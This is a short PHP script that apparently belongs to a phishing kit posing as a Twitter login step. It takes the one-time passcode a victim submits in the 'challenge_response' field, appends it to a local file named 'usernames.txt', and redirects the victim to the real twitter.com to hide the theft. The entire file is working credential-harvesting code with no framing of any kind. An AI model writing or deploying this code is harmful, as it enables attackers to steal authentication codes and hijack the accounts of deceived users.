<?php

    file_put_contents("usernames.txt", "OTP: " . $_POST['challenge_response'] . "\n", FILE_APPEND);
header('Location: https://twitter.com');
exit();